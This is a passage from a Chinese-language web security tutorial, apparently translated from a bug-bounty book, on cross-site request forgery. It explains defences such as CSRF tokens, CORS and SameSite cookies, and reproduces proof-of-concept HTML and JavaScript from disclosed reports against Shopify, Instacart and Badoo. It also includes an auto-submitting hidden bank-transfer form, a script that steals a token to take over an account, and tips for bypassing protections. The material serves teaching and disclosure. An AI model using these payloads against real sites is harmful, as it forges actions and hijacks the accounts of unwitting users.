https://www.bank.com/transfer?from=bob&amp;to=joe&amp;amount=500”&gt;</code></p><p>结果，Bob访问攻击者拥有的网站时，它在HTTP响应中包含<code>&lt;img&gt;</code>标记，然后浏览器向银行发出HTTP GET请求。浏览器发送Bob的身份验证Cookie，以获取其认为应该是图像的图像。但实际上，银行收到了请求，处理了标签的<code>src</code>属性中的URL，并创建了转帐请求。</p><p>为避免此漏洞，开发人员切勿使用HTTP GET请求执行任何后端数据修改请求，例如转账。但是任何只读请求都应该是安全的。许多用于构建网站的常用网络框架（例如Ruby on Rails，Django等）都希望开发人员遵循此原则，因此它们会自动将CSRF保护添加到POST请求中，而不是GET请求中。</p><h2 id="CSRF与POST请求"><a href="#CSRF与POST请求" class="headerlink" title="CSRF与POST请求"></a>CSRF与POST请求</h2><p>如果银行通过POST请求执行转帐，则您需要使用其他方法来创建CSRF攻击。攻击者无法使用<code>&lt;img&gt;</code>标记，因为<code>&lt;img&gt;</code>标记无法调用POST请求。攻击者的策略将取决于POST请求的内容。</p><p>最简单的情况是带有<code>content-type</code> 为<code>application / x-www-form-urlencoded</code>或<code>text / plain</code>的POST请求。<code>content-type</code>是浏览器在发送HTTP请求时可能包含的头。头告诉接收者HTTP请求主体的编码方式。这是一个text/plain类型请求的示例：</p><pre class="line-numbers language-none"><code class="language-none">POST / HTTP/1.1  Host: www.google.ca  User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  Content-Length: 5➊ Content-Type: text/plain;charset=UTF-8  DNT: 1  Connection: close  hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>content-type</code>➊被标记，并且其类型与请求的字符编码一起列出。<code>content-type</code>很重要，因为浏览器对待类型的方式有所不同。</p><p>在这个例子，恶意网站可能会创建隐藏的HTML表单，并在目标不知情的情况下将其提交给易受攻击的网站。该表单可以向URL提交POST或GET请求，甚至可以提交参数值。这是网站中一些有害代码的示例，恶意链接会将Bob定向到这些有害代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">➊ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">display</span><span class="token punctuation">:</span>none</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-frame<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span> ➋ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>POST<span class="token punctuation">'</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://bank.com/transfer<span class="token punctuation">'</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-frame<span class="token punctuation">"</span></span>   <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-form<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  ➌ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hidden<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>from<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Bob<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hidden<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>to<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Joe<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hidden<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>amount<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>500<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> ➍ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"csrf-form"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它使用表单向Bob的银行发出HTTP POST请求（用<code>&lt;form&gt;</code>标记中的action属性）。由于攻击者不希望Bob看到表单，因此每个<code>&lt;input&gt;</code>元素都被赋予了“hidden”类型，这使它们在Bob看到的网页上不可见。最后一步，攻击者在<code>&lt;script&gt;</code>标记内包含一些JavaScript，以在页面加载时自动提交表单➍。 JavaScript通过在HTML文档上调用<code>getElementByID（）</code>方法来实现此目的，我们在第二行set中将表单的<code>ID（“ csrf-form”）</code>设置为参数。与GET请求一样，一旦提交表单，浏览器就会发出HTTP POST请求，以将Bob的cookie发送到银行网站，该银行网站会调用转帐。由于POST请求将HTTP响应发送回浏览器，因此攻击者使用<code>display：none</code>属性➊将响应隐藏在<code>iFrame</code>中。结果，Bob看不到它，也没有意识到发生了什么。</p><p>有些网站可能希望POST请求使用content-type 为<code>application / json</code>。<code>application/ json</code>类型的请求可能带有CSRF token。该token是与HTTP请求一起提交的值，因此合法网站可以验证该请求是否源于自身而不是来自另一个恶意网站。有时POST请求的HTTP主体中包含token，但在其他时候，POST请求具有一个自定义头，其名称类似于<code>X-CSRF-TOKEN</code>。当浏览器向站点发送一个<code>application / json</code> POST请求时，它将在POST请求之前发送一个OPTIONS 请求。然后，该网站将返回对OPTIONS调用的响应，指示其接受的HTTP请求类型以及受信任的来源。这称为预检OPTIONS调用。浏览器读取此响应，然后发出适当的HTTP请求，在我们的银行示例中，该请求将是用于转账的POST请求。</p><p>如果实施正确，则预检OPTIONS调用可防止某些CSRF漏洞：服务器不会将恶意站点列为受信任的站点，并且浏览器将仅允许特定网站（白名单）读取HTTP OPTIONS响应。结果，由于恶意网站无法读取OPTIONS响应，因此浏览器将不会发送恶意POST请求。</p><p>定义网站何时以及如何读取彼此的响应的一组规则称为跨域资源共享（CORS）。 CORS限制从提供文件或正在测试的站点允许的域之外的域进行资源访问，包括JSON响应访问。换句话说，当开发人员使用CORS保护网站时，除非被测试的网站允许，否则您无法提交应用application/ json请求来调用被测试的应用程序，读取响应并进行另一个调用。在某些情况下，您可以通过<code>content-type</code>更改为<code>application / x-www-form-urlencoded，multipart / form-data or text / plain</code>来绕过这些保护。在发出POST请求时，浏览器不会针对这三种内容类型中的任何一种发送预检OPTIONS调用，因此CSRF请求可能有效。如果不是，请查看服务器HTTP响应中的<code>Access-Control-Allow-Origin</code>，以再次检查服务器是否不信任任意来源。如果从任意来源发送请求时该响应标头发生变化，则该站点可能会有更大的问题，因为该站点允许任何来源读取其服务器的响应。这允许存在CSRF漏洞，但也可能允许恶意攻击者读取服务器的HTTP响应中返回的所有敏感数据。</p><h2 id="防御CSRF攻击"><a href="#防御CSRF攻击" class="headerlink" title="防御CSRF攻击"></a>防御CSRF攻击</h2><p>您可以通过多种方式抵御CSRF漏洞。抵御CSRF攻击的最流行的保护形式之一是CSRF 令牌（token）。提交有可能更改数据的请求（即POST请求）时，受保护的站点需要CSRF令牌。在这种情况下，Web应用程序（例如Bob的银行）将生成一个由两部分组成的令牌：Bob会收到一个令牌，而应用程序会保留一个令牌。当Bob尝试提出转帐请求时，他将必须提交自己的令牌，然后银行将使用令牌这一边对其进行验证。这些令牌的设计使其无法猜测，并且只能由分配给它们的特定用户（例如Bob）访问。此外，它们的名称并不总是很明显，但是名称的一些潜在示例包括<code>X-CSRF-TOKEN</code>，<code>lia-token</code>，<code>rt</code>或<code>form-id</code>。令牌可以包含在HTTP请求头中，HTTP POST主体中或作为隐藏字段，如以下示例所示：</p> <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>POST<span class="token punctuation">'</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://bank.com/transfer<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>from<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Bob<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>to<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Joe<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>amount<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>500<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hidden<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>csrf<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>lHt7DDDyUNKoHCC66BsPB8aN4p24hxNu6ZuJA+8l+YA=<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 在此示例中，网站可以从Cookie，网站上的嵌入式脚本或从网站传递的内容的一部分中获取CSRF令牌。无论采用哪种方法，只有目标服务器的网络浏览器才知道并能够读取该值。由于攻击者无法提交令牌，因此他们将无法成功提交POST请求，也无法进行CSRF攻击。但是，仅网站使用CSRF令牌并不意味着它在搜索要利用的漏洞时是死路一条。可以尝试删除令牌，更改其值等。</p><p>网站保护自己的另一种方式是使用CORS。但是，这并不是万无一失的，因为它依赖于浏览器的安全性并确保正确的CORS配置来确定第三方网站何时可以访问响应。由于服务器端配置错误，攻击者有时可以通过将<code>content-type</code>从<code>application / json</code>更改为<code>application / x-www-form-urlencoded</code>来绕过CORS，或者通过使用GET请求而不是POST请求来绕过CORS。顺利绕过的原因是，当内容类型为<code>application / json</code>时，浏览器将自动发送OPTIONS HTTP请求，但如果是GET请求或内容类型为<code>application / x-www-form</code>，则不会自动发送OPTIONS HTTP请求。</p><p>最后，还有另外两种不太常见的CSRF缓解策略。首先，站点可以检查与HTTP请求一起提交的<code>Origin</code>或<code>Referer</code> header的值，并确保它包含预期值。例如，在某些情况下，Twitter将检查<code>Origin</code>，如果不包含<code>Origin</code>，则检查<code>Referer</code>。之所以可行，是因为浏览器控制这些头，并且攻击者无法远程设置或更改它们（显然，这排除了利用浏览器或浏览器插件中的漏洞可能允许攻击者控制header）。其次，浏览器现在开始实现对名为<code>samesite</code>的新cookie属性的支持。可以将此属性设置为<code>strict</code>或<code>lax</code>。设置为“strict”后，浏览器将不会使用任何不是来自网站的HTTP请求发送Cookie。这甚至包括简单的HTTP GET请求。例如，如果您登录到Amazon并且使用了<code>strict</code>的<code>samesite</code> cookie，那么如果您跟踪来自另一个站点的链接，浏览器将不会提交您的cookie。此外，在您访问另一个Amazon网页并提交cookie之前，Amazon不会将您识别为已登录。相反，将<code>samesite</code>属性设置为lax则指示浏览器发送带有初始GET请求的cookie。这支持GET请求永远不要更改服务器端数据的设计原则。在这种情况下，如果您登录到Amazon并且使用了的<code>lax</code>samesite cookie，则浏览器将提交您的cookie，并且如果您已从另一个站点重定向到该站点，Amazon将识别您已登录。</p><h2 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h2><h3 id="Shopify-断开Twitter关联账户"><a href="#Shopify-断开Twitter关联账户" class="headerlink" title="Shopify 断开Twitter关联账户"></a>Shopify 断开Twitter关联账户</h3><p>难度：低</p><p>网址：<code>https：//twitter-commerce.shopifyapps.com/auth/twitter/disconnect/</code></p><p>资料来源：<a href="https://www.hackerone.com/reports/111216/">https://www.hackerone.com/reports/111216/</a></p><p>报告日期：2016年1月17日</p><p>赏金支付：$ 500</p><p>当您寻找潜在的CSRF漏洞时，请注意用于修改服务器端数据的GET请求。例如，某黑客在Shopify功能中发现了一个漏洞，该漏洞将Twitter集成到网站中，从而使店主可以发布有关其产品的推文。该功能还允许用户从关联的商店断开Twitter帐户关联。断开Twitter帐户的URL为：</p><p><code>https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect/</code></p><p>事实证明，访问此URL将发送GET请求以断开帐户关联，如下所示：</p><pre class="line-numbers language-none"><code class="language-none">GET /auth/twitter/disconnect HTTP/1.1Host: twitter-commerce.shopifyapps.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0Accept: text/html, application/xhtml+xml, application/xmlAccept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: https://twitter-commerce.shopifyapps.com/accountCookie: _twitter-commerce_session=REDACTEDConnection: keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 此外，当链接最初实现时，Shopify并没有验证发送给它的GET请求的合法性，从而使URL容易受到CSRF的攻击。</p><p>提交报告的黑客提供了以下ROC 的HTML文档：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  ➊ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此HTML文档将使浏览器通过<code>&lt;img&gt;</code>标记的<code>src</code>属性将HTTP GET请求发送到<code>https://twitter-commerce.shopifyapps.com</code>。如果拥有连接到Shopify的Twitter帐户的人访问带有此<code>&lt;img&gt;</code>标记的网页，则其Twitter帐户将与Shopify断开关联。</p><p><strong>重点</strong></p><p>密切注意在服务器上执行某些操作的HTTP请求，例如通过GET请求断开Twitter帐户。如前所述，GET请求永远不要修改服务器上的任何数据。在这种情况下，您可以通过使用代理服务器（例如Burp或OWASP的ZAP）来监视发送到Shopify的HTTP请求，从而发现该漏洞。</p><h3 id="更改Instacart用户的区域"><a href="#更改Instacart用户的区域" class="headerlink" title="更改Instacart用户的区域"></a>更改Instacart用户的区域</h3><p>难度：低</p><p>网址：<code>https：//admin.instacart.com/api/v2/zones/</code></p><p>资料来源：<a href="https://hackerone.com/reports/157993/">https://hackerone.com/reports/157993/</a></p><p>报告日期：2015年8月9日</p><p>赏金支付：$ 100</p><p>在查看攻击面时，请记住考虑网站的API endpoint及其网页。 Instacart是一个杂货店交付应用程序，它允许其交付者定义他们工作的区域。该站点通过向Instacart 的admin子域发送POST请求来更新这些区域。黑客发现该子域上的区域容易受到CSRF的攻击。您可以使用以下代码修改目标区域：</p> <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  ➊ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://admin.instacart.com/api/v2/zones<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   ➋ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zip<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10001<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  ➌ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>override<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  ➍ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在此示例中，黑客创建了一个HTML表单，以将HTTP POST请求发送到<code>/ api / v2 / zones</code>➊。它包括两个隐藏的输入：一个将用户的新区域设置为邮政编码10001➋，另一个将API的override参数设置为true➌，以便将用户的当前zip值替换为黑客提交的值。另外，与Shopify示例不同，黑客使用了一个提交按钮来发出POST请求，而Shopify示例使用了自动提交JavaScript函数。</p><p>尽管此示例仍然成功，但黑客可以通过使用前面介绍的技术来改善漏洞利用，例如使用隐藏的iFrame代表目标用户自动提交请求。这将向Instacart漏洞赏金分类程序演示攻击者如何以较少的目标操作来使用此漏洞；与未完全控制相比，完全由攻击者控制的漏洞更有可能获得奖金。</p><p><strong>重点</strong></p><p>当您寻找漏洞利用时，请扩大攻击范围，并不仅仅是网站页面，而是要包含其API endpoint，这些endpoint很可能带来漏洞。有时，开发人员会忘记黑客可以发现和利用API endpoint，因为它们不像网页那样容易获得。移动应用程序经常向API endpoint发出HTTP请求，您可以像访问网站一样使用Burp或ZAP进行监视。</p><h3 id="Badoo完全帐户接管"><a href="#Badoo完全帐户接管" class="headerlink" title="Badoo完全帐户接管"></a>Badoo完全帐户接管</h3><p>难度：中等</p><p>网址：<code>https：//www.badoo.com/</code></p><p>资料来源：<a href="https://hackerone.com/reports/127703/">https://hackerone.com/reports/127703/</a></p><p>报告日期：2016年4月1日</p><p>赏金支付：852美元</p><p>尽管开发人员经常使用CSRF令牌来防御CSRF漏洞，但在某些情况下，攻击者可以窃取令牌，如您在此漏洞中所看到的。如果您浏览社交网站<code>https://www.badoo.com/</code>，将会看到它使用CSRF令牌。更具体地说，它使用每个用户唯一的URL参数<code>rt</code>。当Badoo的Bug赏金计划在HackerOne上发布时，我找不到利用它的方法。但是，黑客Mahmoud Jamal确实做到了。</p><p>Jamal认识到<code>rt</code>参数及其意义。他还注意到几乎所有JSON响应都返回了该参数。不幸的是，这无济于事，因为CORS可以保护Badoo免受攻击者读取这些响应的攻击，因为它们被编码为<code>application/json</code>内容类型。但是Jamal坚持挖掘。</p><p>Jamal最终找到了JavaScript文件<code>https://eu1.badoo.com/worker-scope/chrome-service-worker.js</code>，该文件包含一个名为<code>url_stats</code>的变量，并设置为以下值：</p><p><code>var url_stats ='https://eu1.badoo.com/chrome-push-stats?ws=1&amp;rt= &lt;➊rt_param_value&gt;';</code></p><p>当用户的浏览器访问JavaScript文件➊时，<code>url_stats</code>变量存放一个URL，该URL包含用户的唯一<code>rt</code>值作为参数。为了获得用户的<code>rt</code>值，攻击者只需要受害者访问包含JavaScript文件的恶意网页。 CORS不会阻止此操作，因为它允许浏览器从外部源读取和嵌入远程JavaScript文件。然后，攻击者可以使用<code>rt</code>值将任何社交媒体帐户与用户的Badoo帐户相关联。攻击者可以调用HTTP POST请求来修改目标帐户。这是Jamal用于完成此攻击的HTML：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>   <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>Badoo account take over<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>  ➊ <span class="token operator">&lt;</span>script src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>eu1<span class="token punctuation">.</span>badoo<span class="token punctuation">.</span>com<span class="token operator">/</span>worker<span class="token operator">-</span>scope<span class="token operator">/</span>chrome<span class="token operator">-</span>service<span class="token operator">-</span>worker<span class="token punctuation">.</span>js<span class="token operator">?</span>ws<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>   <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>   ➋ <span class="token keyword">function</span> <span class="token function">getCSRFcode</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>   ➌ window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   ➍ <span class="token keyword">var</span> csrf_code <span class="token operator">=</span> <span class="token function">getCSRFcode</span><span class="token punctuation">(</span>url_stats<span class="token punctuation">)</span><span class="token punctuation">;</span>    ➎ csrf_url <span class="token operator">=</span> <span class="token string">'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3y  fn2SFUBear08KQaXo609JkArgoju1gZ6Pc&amp;authuser=3&amp;session_state=7cb85df679     219ce71044666c7be3e037ff54b560..a810&amp;prompt=none&amp;rt='</span><span class="token operator">+</span> csrf_code<span class="token punctuation">;</span>    ➏ window<span class="token punctuation">.</span>location <span class="token operator">=</span> csrf_url<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>   <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当目标加载该页面时，该页面将通过在<code>&lt;script&gt;</code>标记➊中将其作为<code>src</code>属性引用来加载Badoo的 JavaScript。加载脚本后，网页将调用JavaScript函数<code>window.onload</code>，它定义了一个匿名JavaScript函数➌。网页加载时，浏览器调用<code>onload</code>事件处理程序；因为Jamal定义的函数在<code>window.onload</code>处理程序中，所以在加载页面时就会调用他的函数。</p><p>接下来，Jamal创建了一个<code>csrf_code</code>变量➍，并为其分配了在➋处定义的名为<code>getCSRFcode</code>的函数的返回值。 <code>getCSRFcode</code>函数在每个’=’字符处将字符串分割成字符串数组。然后，它返回数组的第三个成员的值。当函数从Badoo易受攻击的JavaScript文件中解析变量<code>url_stats</code>时，它将字符串拆分为以下数组值：</p><p><code>https://eu1.badoo.com/chrome-push-stats?ws,1&amp;rt,&lt;rt_param_value&gt;</code></p><p>然后，该函数返回数组的第三个成员（即<code>rt</code>值），并将其分配给<code>csrf_code</code>。</p><p>拥有CSRF令牌后，Jamal创建了<code>csrf_url</code>变量，该变量存储了指向Badoo的<code>/google/verify.phtml</code>网页的URL。该网页将自己的Google帐户链接到目标的Badoo帐户➎。该页面需要一些参数，这些参数被硬编码到URL字符串中。我不会在这里详细介绍它们，因为它们特定于Badoo。但是，请注意最后的<code>rt</code>参数，该参数没有硬编码的值。而是将<code>csrf_code</code>连接到URL字符串的末尾，以便将其作为<code>rt</code>参数的值传递。然后，Jamal通过调用<code>window.location</code> 发出HTTP请求，并将其分配给<code>csrf_url</code>，<code>csrf_url</code>将访问用户的浏览器重定向到➎处的URL。这会致使对Badoo的GET请求，该请求会验证<code>rt</code>参数并处理该请求，以将目标的Badoo帐户链接到Jamal的Google帐户，从而完成帐户的接管。</p><p><strong>重点</strong></p><p>哪里有烟，哪里就有火。 Jamal注意到<code>rt</code>参数在不同的位置返回，尤其是在JSON响应中返回。因此，他正确地猜测到rt可能会出现在攻击者可以访问和利用它的某个地方，在本例中为javascript文件。如果您觉得网站可能容易受到攻击，请继续进行挖掘。在这种情况下，我认为CSRF令牌只有五位数字并包含在URL中是很奇怪的。通常，令牌要长得多，使令牌更难猜测，并且包含在HTTP 